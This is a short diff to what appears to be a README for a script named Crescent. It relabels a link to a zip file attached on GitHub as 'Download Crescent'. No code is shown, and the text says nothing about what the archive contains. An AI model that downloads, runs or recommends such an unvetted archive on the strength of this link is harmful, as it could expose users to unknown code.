@@ -26,4 +26,4 @@ No official support or updates are guaranteed.
 
 You may modify the script as needed.
 
-[Crescent.lol.zip](https://github.com/user-attachments/files/20765298/Crescent.lol.zip)
+[Download Crescent](https://github.com/user-attachments/files/20765298/Crescent.lol.zip)
